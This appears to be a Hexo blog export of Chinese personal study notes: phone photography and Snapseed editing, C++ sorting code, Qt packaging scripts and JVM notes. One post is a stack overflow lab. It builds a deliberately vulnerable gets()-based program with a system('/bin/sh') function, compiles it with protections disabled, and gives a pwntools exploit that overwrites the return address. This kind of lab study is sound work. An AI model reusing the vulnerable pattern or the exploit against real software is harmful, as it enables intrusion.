<p><img src="/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/image-20211223150720064.png" alt="image-20211223150720064"></p>
<p>二、复杂主体</p>
<p>三分法：利用网格将元素分成大致三分</p>
<p>三、对称法</p>
<p>想要突出物体的庄严肃穆稳定时</p>
<p>四、三角形构图</p>
<p>同样比较稳定，下图既是对称又是三角形。实际上只要有高矮之分时，就可以在画面中找到比较突出的几个元素构成三角形，视情况而定捕捉到比较好的画面。</p>
<p><img src="/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/image-20211223151824234.png" alt="image-20211223151824234"></p>
<p>五、前中后景构图</p>
<p>前景中景后景，通过画面中一定的线条或某些物体连接起来，有更好的纵深，更强的空间感。</p>
<p>六、重复元素</p>
<p>七、小结</p>
<p>（1）一张好的照片包含多种构图手法</p>
<p>（2）画面中要有矛盾、对比、反差，会更有可读性</p>
<h2 id="2-手机摄影后期知识（1）"><a href="#2-手机摄影后期知识（1）" class="headerlink" title="2 手机摄影后期知识（1）"></a>2 手机摄影后期知识（1）</h2><p>Snapseed：逻辑清晰功能明确的全面调整</p>
<p>VSCO：胶片类质感的调整</p>
<h2 id="3-Snapseed"><a href="#3-Snapseed" class="headerlink" title="3 Snapseed"></a>3 Snapseed</h2><p>常用滤镜：色调对比度、魅力光晕、复古12号</p>
<h3 id="一、调整图片"><a href="#一、调整图片" class="headerlink" title="一、调整图片"></a>一、调整图片</h3><p><img src="/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/image-20211228173105751.png" alt="image-20211228173105751"></p>
<p><img src="/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/image-20211228172829614.png" alt="image-20211228172829614" style="zoom:30%;"></p>
<h4 id="（1）对比度"><a href="#（1）对比度" class="headerlink" title="（1）对比度"></a>（1）对比度</h4><p>对比度太低会让白色不白，黑色不黑，画面发灰</p>
<h4 id="（2）饱和度"><a href="#（2）饱和度" class="headerlink" title="（2）饱和度"></a>（2）饱和度</h4><p>让色彩更浓郁，更纯正</p>
<h4 id="（3）氛围"><a href="#（3）氛围" class="headerlink" title="（3）氛围"></a>（3）氛围</h4><p>提高氛围：平衡光比，亮的变暗，暗的变亮</p>
<p>降低氛围：增强光比，亮的更亮，暗的更暗</p>
<h4 id="（4）高光"><a href="#（4）高光" class="headerlink" title="（4）高光"></a>（4）高光</h4><p>较亮处的亮度调节更亮</p>
<h4 id="（5）阴影"><a href="#（5）阴影" class="headerlink" title="（5）阴影"></a>（5）阴影</h4><p>较暗处调节更暗</p>
<h4 id="注意：直方图"><a href="#注意：直方图" class="headerlink" title="注意：直方图"></a>注意：直方图</h4><p>使用工具——“调整图片”时，可以注意到左下角有直方图标志，点击即可查看。</p>
<p><img src="/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/image-20211228173809811.png" alt="image-20211228173809811"></p>
<p><img src="/2021/12/21/%E6%89%8B%E6%9C%BA%E6%91%84%E5%BD%B1/image-20211228173825096.png" alt="image-20211228173825096"></p>
<p>意义：表示画面的明暗，反应图片中像素亮度的分布。</p>
<p>作用：直方图可以精准地反应照片的曝光。最左是欠曝，最右是过曝。</p>
<h3 id="二、突出细节"><a href="#二、突出细节" class="headerlink" title="二、突出细节"></a>二、突出细节</h3><h4 id="（1）结构"><a href="#（1）结构" class="headerlink" title="（1）结构"></a>（1）结构</h4><p>对结构边缘进行一些增强，让画面边缘的反差变得明显</p>
<h4 id="（2）锐化"><a href="#（2）锐化" class="headerlink" title="（2）锐化"></a>（2）锐化</h4><p>对画面中的每个像素进行无差别调整，让画面变得更清晰。</p>
<h3 id="三、视角"><a href="#三、视角" class="headerlink" title="三、视角"></a>三、视角</h3><p>对画面透视感的改变，比如拍摄楼群时，有时会因拍摄角度的问题而导致照片拍出来，楼是“倾斜”的，可以通过“视角”扶正。</p>
<h3 id="四、白平衡"><a href="#四、白平衡" class="headerlink" title="四、白平衡"></a>四、白平衡</h3><h4 id="调整白平衡的标准"><a href="#调整白平衡的标准" class="headerlink" title="调整白平衡的标准"></a>调整白平衡的标准</h4><p>把本来就是白色的东西调成白色</p>
<h4 id="（1）着色"><a href="#（1）着色" class="headerlink" title="（1）着色"></a>（1）着色</h4><p>左绿右红</p>
<h4 id="（2）色温"><a href="#（2）色温" class="headerlink" title="（2）色温"></a>（2）色温</h4><p>左蓝右黄</p>
<h2 id="4-手机摄影后期知识（2）"><a href="#4-手机摄影后期知识（2）" class="headerlink" title="4 手机摄影后期知识（2）"></a>4 手机摄影后期知识（2）</h2><p><a href="https://www.bilibili.com/video/BV13q4y1s7X6?p=4">https://www.bilibili.com/video/BV13q4y1s7X6?p=4</a></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>摄影</tag>
      </tags>
  </entry>
  <entry>
    <title>排序算法</title>
    <url>/2021/06/28/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><ul>
<li>时间复杂度 $O(n*long_2(n))$</li>
<li>空间复杂度 $O(n)$</li>
<li>稳定</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使数组 arr 在 L,R 范围内有序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == R) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = L + ((R - L) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 使 L,mid 区间有序</span></span><br><span class="line">    <span class="built_in">process</span>(arr, L, mid);</span><br><span class="line">    <span class="comment">// 使 mid,R 有序</span></span><br><span class="line">    <span class="built_in">process</span>(arr, mid + <span class="number">1</span>, R);</span><br><span class="line">    <span class="comment">// 经过上面两次过程，整体还是无序的，因此需要进行 merge</span></span><br><span class="line">    <span class="built_in">mergeSort</span>(arr, L, mid, R);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> M, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">help</span><span class="params">(R - L + <span class="number">1</span>)</span></span>;  <span class="comment">// L,R 范围的辅助空间</span></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> p1 = L;</span><br><span class="line">    <span class="keyword">int</span> p2 = M + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (p1 &lt;= M &amp;&amp; p2 &lt;= R) &#123;</span><br><span class="line">        <span class="comment">// p1 p2 都没越界，谁小就拷贝到 help</span></span><br><span class="line">        help[i++] = arr[p1] &lt;= arr[p2] ? arr[p1++] : arr[p2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p1 &lt;= M) &#123;</span><br><span class="line">        help[i++] = arr[p1++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p2 &lt;= R) &#123;</span><br><span class="line">        help[i++] = arr[p2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; help.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        arr[L + i] = help[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><ul>
<li>时间复杂度 $O(n*long_2(n))$</li>
<li>空间复杂度 $O(long_2(n))$</li>
<li>不稳定</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="function">uniform_real_distribution&lt;<span class="keyword">float</span>&gt; <span class="title">u</span><span class="params">(<span class="number">0</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    default_random_engine e;</span><br><span class="line">    <span class="keyword">if</span> (L &lt; R) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(arr[L + (<span class="keyword">int</span>)(<span class="built_in">u</span>(e) * (R - L + <span class="number">1</span>))], arr[R]);  <span class="comment">// 随机选一个位置与最后一个数做交换</span></span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; p = <span class="built_in">partition</span>(arr, L, R);  <span class="comment">// 长度为 2 的数组，p[0] p[1] 分别表示等于区域的左右边界</span></span><br><span class="line">        <span class="built_in">quickSort</span>(arr, L, p[<span class="number">0</span>] - <span class="number">1</span>);  <span class="comment">// 小于区域</span></span><br><span class="line">        <span class="built_in">quickSort</span>(arr, p[<span class="number">1</span>] + <span class="number">1</span>, R);  <span class="comment">// 大于区域</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">partition</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> less = L - <span class="number">1</span>;  <span class="comment">// 小于区域右边界</span></span><br><span class="line">    <span class="keyword">int</span> more = R;  <span class="comment">// 大于区域左边界</span></span><br><span class="line">    <span class="keyword">while</span> (L &lt; more) &#123;  <span class="comment">// L 表示当前数的位置，R 表示划分值的位置</span></span><br><span class="line">        <span class="keyword">if</span> (arr[L] &lt; arr[R]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(arr[++less], arr[L++]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (arr[L] &gt; arr[R]) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(arr[--more], arr[L]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            L++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">swap</span>(arr[more], arr[R]);</span><br><span class="line">    <span class="keyword">return</span> &#123; less + <span class="number">1</span>, more &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出实验</title>
    <url>/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<p><code>gets</code> 参考 CSAPP P195<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">gets</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span>* dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF) &#123;</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="built_in">gets</span>(&amp;v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>修改 version2</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">gets</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c;</span><br><span class="line">    <span class="keyword">char</span>* dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = <span class="built_in">getchar</span>()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF) &#123;</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>*  <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">gets</span>(&amp;v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vuln</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>关闭保护</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">g++ -fno-stack-protector -z execstack -no-pie stack.cpp -o stack</span><br></pre></td></tr></table></figure>
<ul>
<li>得到可执行文件 stack，拿到 IDA 64 反编译</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235648172.png" alt="image-20210623235648172"></p>
<ul>
<li><code>checksec --file=stack</code> 结果如下</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235709636.png" alt="image-20210623235709636"></p>
<ul>
<li>vuln 函数如下</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000730044.png" alt="image-20210624000730044"></p>
<ul>
<li>栈信息如下，因此需要覆盖 9 个字符到达返回地址</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000706356.png" alt="image-20210624000706356"></p>
<ul>
<li>shell 地址 0x4006F4；shell 的 retn 地址 0x400705（因为本地环境是 Ubuntu 18，所以要做堆栈平衡需要知道 retn 地址）</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210623235917096.png" alt="image-20210623235917096"></p>
<ul>
<li>exp.py 代码如下</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">shell = <span class="number">0x4006F4</span></span><br><span class="line">retn = <span class="number">0x400705</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + p64(retn) + p64(shell)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><code>python exp.py</code>，可以打通本地，结果如下</li>
</ul>
<p><img src="/2021/06/23/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E9%AA%8C/image-20210624000416446.png" alt="image-20210624000416446"></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>漏洞实验</tag>
      </tags>
  </entry>
  <entry>
    <title>打包Qt项目</title>
    <url>/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h2 id="1-Linux环境"><a href="#1-Linux环境" class="headerlink" title="1 Linux环境"></a>1 Linux环境</h2><h3 id="1-1-构建-Release-版本"><a href="#1-1-构建-Release-版本" class="headerlink" title="1.1 构建 Release 版本"></a>1.1 构建 Release 版本</h3><ul>
<li>Projects - Add Release - 添加版本名称并确定 - Build</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608094704865.png" alt="image-20210608094704865"></p>
<h3 id="1-2-脚本文件"><a href="#1-2-脚本文件" class="headerlink" title="1.2 脚本文件"></a>1.2 脚本文件</h3><ul>
<li>进入上文构建的 Release 目录</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi copylib.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>copylib.sh 内容如下（此处无需修改）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LibDir=$PWD&quot;/lib&quot;</span><br><span class="line">Target=$1</span><br><span class="line"></span><br><span class="line">lib_array=($(ldd $Target | grep -o &quot;/.*&quot; | grep -o &quot;/.*/[^[:space:]]*&quot;))</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">(mkdir <span class="variable">$LibDir</span>)</span></span><br><span class="line"></span><br><span class="line">for Variable in $&#123;lib_array[@]&#125;</span><br><span class="line">do</span><br><span class="line">    cp &quot;$Variable&quot; $LibDir</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<h3 id="1-3-生成项目的库文件"><a href="#1-3-生成项目的库文件" class="headerlink" title="1. 3 生成项目的库文件"></a>1. 3 生成项目的库文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 copylib.sh</span><br><span class="line">./copylib.sh projectName</span><br></pre></td></tr></table></figure>
<ul>
<li>projectName 为项目名，我的是 Client，根据自己项目自行修改。随即在同目录生成了 lib 文件夹</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608100547153.png" alt="image-20210608100547153"></p>
<ul>
<li>桌面新建空文件夹，这里命名为 new</li>
<li>将上文中构建的 Release 版本的二进制文件及库文件全部复制到新建的这个 new 中来，（不保留 lib 目录，将其中文件均复制过来）</li>
</ul>
<h3 id="1-4-Qt-安装目录的插件中提取-platforms"><a href="#1-4-Qt-安装目录的插件中提取-platforms" class="headerlink" title="1. 4 Qt 安装目录的插件中提取 platforms"></a>1. 4 Qt 安装目录的插件中提取 platforms</h3><ul>
<li>进入 <code>/opt/Qt5.14.2/5.14.2/gcc_64/plugins/platforms</code></li>
<li>将 copylib.sh 复制到的platforms</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./copylib.sh libqxcb.so</span><br></pre></td></tr></table></figure>
<ul>
<li>这会生成一个新的 lib 文件夹，将此文件夹所有文件均复制到 new 目录中，删除这个 lib 文件夹</li>
<li>遇到同名文件则跳过，将整个 platforms 复制到 new 目录中</li>
<li>在 new 目录新建与项目同名的脚本，这里是 Client.sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi projectName.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">appname=`basename $0 | sed s,\.sh$,,`</span><br><span class="line"></span><br><span class="line">dirname=`dirname $0`</span><br><span class="line">tmp=&quot;$&#123;dirname#?&#125;&quot;</span><br><span class="line"></span><br><span class="line">if [ &quot;$&#123;dirname%$tmp&#125;&quot; != &quot;/&quot; ]; then</span><br><span class="line">dirname=$PWD/$dirname</span><br><span class="line">fi</span><br><span class="line">LD_LIBRARY_PATH=$dirname</span><br><span class="line">export LD_LIBRARY_PATH</span><br><span class="line"><span class="meta">$</span><span class="bash">dirname/<span class="variable">$appname</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 projectName.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>到这里按说是完成了，但是执行这个 projectName.sh 时，会报错，遇到了xcb的问题，这个问题可以通过 ldd 和 Qt 的调试设置来查明</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608102722541.png" alt="image-20210608102722541"></p>
<h3 id="1-5-解决-xcb-问题"><a href="#1-5-解决-xcb-问题" class="headerlink" title="1. 5 解决 xcb 问题"></a>1. 5 解决 xcb 问题</h3><ul>
<li>设置环境变量，以便于看到 Qt 加载的过程，看到详细的报错信息。然后执行上文中的 projectName.sh</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export QT_DEBUG_PLUGINS=1</span><br><span class="line">./projectName.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>根据标准输出找问题</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608103812082.png" alt="image-20210608103812082"></p>
<ul>
<li>这里的问题是找不到 libQt5XcbQpa.so.5</li>
<li>可以去 Qt 安装目录的 platforms 目录找（出现 xcb 问题一般是因为以上 platforms 中执行 copylib 的顺序有问题，如果先将 platforms 复制到新目录再执行 copylib 就会缺失一部分库，因此需要在 Qt 安装目录中执行）</li>
</ul>
<h3 id="1-6-移植到其他机器的注意事项"><a href="#1-6-移植到其他机器的注意事项" class="headerlink" title="1. 6 移植到其他机器的注意事项"></a>1. 6 移植到其他机器的注意事项</h3><ul>
<li>打包后，启动程序应该使用 <code>projectName.sh</code> 而不是直接运行 projectName 的二进制文件</li>
<li>执行上述 sh 文件可能会提示权限不够，这时需要给 projectName 二进制文件以及 projectName.sh 脚本 777 权限</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 projectName</span><br><span class="line">chmod 777 projectName.sh </span><br></pre></td></tr></table></figure>
<h3 id="1-7-Reference"><a href="#1-7-Reference" class="headerlink" title="1.7 Reference"></a>1.7 Reference</h3><ol>
<li><p>打包 <a href="https://blog.csdn.net/z3512498/article/details/64922180?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control&amp;dist_request_id=1328603.71798.16152866709520987&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control">https://blog.csdn.net/z3512498/article/details/64922180?utm_medium=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control&amp;dist_request_id=1328603.71798.16152866709520987&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-searchFromBaidu-12.control</a></p>
</li>
<li><p>xcb <a href="https://www.cnblogs.com/ldxn/p/11791810.html">https://www.cnblogs.com/ldxn/p/11791810.html</a></p>
</li>
<li><p>xcb <a href="https://blog.csdn.net/sinat_26106275/article/details/82778951">https://blog.csdn.net/sinat_26106275/article/details/82778951</a></p>
</li>
</ol>
<h2 id="2-Windows环境"><a href="#2-Windows环境" class="headerlink" title="2 Windows环境"></a>2 Windows环境</h2><h3 id="2-1-构建-Release-版本"><a href="#2-1-构建-Release-版本" class="headerlink" title="2.1 构建 Release 版本"></a>2.1 构建 Release 版本</h3><p>与 Linux 环境同理</p>
<h3 id="2-2-windeployqt-工具拷贝库文件"><a href="#2-2-windeployqt-工具拷贝库文件" class="headerlink" title="2.2 windeployqt 工具拷贝库文件"></a>2.2 windeployqt 工具拷贝库文件</h3><ul>
<li><p>新建文件夹，将 Release 目录中的 exe 文件拷贝到新文件夹下</p>
</li>
<li><p>命令行工具</p>
</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608173440728.png" alt="image-20210608173440728"></p>
<ul>
<li>在命令行中，进入以上新建的目录，并执行命令 <code>windeployqt Server.exe</code>，其中 Server.exe 为 Release 拷过来的可执行文件</li>
</ul>
<p><img src="/2021/03/14/%E6%89%93%E5%8C%85Qt%E9%A1%B9%E7%9B%AE/image-20210608173846947.png" alt="image-20210608173846947"></p>
<ul>
<li>执行完后，文件夹中会多出很多 dll 以及其他一些依赖，Server.exe 也可以正常运行了</li>
</ul>
<h3 id="2-3-Reference"><a href="#2-3-Reference" class="headerlink" title="2.3 Reference"></a>2.3 Reference</h3><p><a href="https://blog.csdn.net/u014453443/article/details/85837138">https://blog.csdn.net/u014453443/article/details/85837138</a></p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解Java虚拟机[笔记]</title>
    <url>/2021/12/24/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JVM/</url>
    <content><![CDATA[<h2 id="1-走进Java"><a href="#1-走进Java" class="headerlink" title="1 走进Java"></a>1 走进Java</h2><h3 id="1-1-Java虚拟机家族"><a href="#1-1-Java虚拟机家族" class="headerlink" title="1.1 Java虚拟机家族"></a>1.1 Java虚拟机家族</h3><h4 id="一、虚拟机始祖：Sun-Classic-Exact-VM"><a href="#一、虚拟机始祖：Sun-Classic-Exact-VM" class="headerlink" title="一、虚拟机始祖：Sun Classic/Exact VM"></a>一、虚拟机始祖：Sun Classic/Exact VM</h4><p>（1）Classic VM：只能使用纯解释器的方式执行Java代码，如果要使用即时编译器就必须进行外挂。</p>
<p>（2）Exact VM：使用准确式内存管理（有能力分辨哪些内存是引用类型，这也是在垃圾收集时判断堆上的数据是否还可能被使用的前提）。</p>
<h4 id="二、武林盟主：HotSpot-VM"><a href="#二、武林盟主：HotSpot-VM" class="headerlink" title="二、武林盟主：HotSpot VM"></a>二、武林盟主：HotSpot VM</h4><ul>
<li>准确式内存管理</li>
<li>热点代码探测：可以通过执行计数器找到最具编译佳值的代码，然后通知即时编译器以方法为单位进行编译。</li>
</ul>
<h4 id="三、天下第二：J9-VM"><a href="#三、天下第二：J9-VM" class="headerlink" title="三、天下第二：J9 VM"></a>三、天下第二：J9 VM</h4><p>模块化做得好</p>
<h3 id="1-2-新一代即时编译器"><a href="#1-2-新一代即时编译器" class="headerlink" title="1.2 新一代即时编译器"></a>1.2 新一代即时编译器</h3><h4 id="一、HotSpot-VM中的两个即时编译器"><a href="#一、HotSpot-VM中的两个即时编译器" class="headerlink" title="一、HotSpot VM中的两个即时编译器"></a>一、HotSpot VM中的两个即时编译器</h4><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>编译速度</th>
<th>代码优化质量</th>
</tr>
</thead>
<tbody>
<tr>
<td>客户端编译器</td>
<td>快</td>
<td>低</td>
</tr>
<tr>
<td>服务端编译器</td>
<td>慢</td>
<td>高</td>
</tr>
</tbody>
</table>
</div>
<h4 id="二、服务公开与微服务区别"><a href="#二、服务公开与微服务区别" class="headerlink" title="二、服务公开与微服务区别"></a>二、服务公开与微服务区别</h4><div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>某服务增加功能时</th>
</tr>
</thead>
<tbody>
<tr>
<td>服务公开</td>
<td>缩小进程范围</td>
</tr>
<tr>
<td>微服务</td>
<td>只在某种特定服务中增加所需功能，不影响整体进程架构</td>
</tr>
</tbody>
</table>
</div>
<h4 id="三、提前编译"><a href="#三、提前编译" class="headerlink" title="三、提前编译"></a>三、提前编译</h4><p>提前编译是相对于即时编译的概念。</p>
<p>（1）优点</p>
<ul>
<li>减少即时编译带来的预热时间，减少Java应用长期给人带来的“第一次运行慢”的不良体验</li>
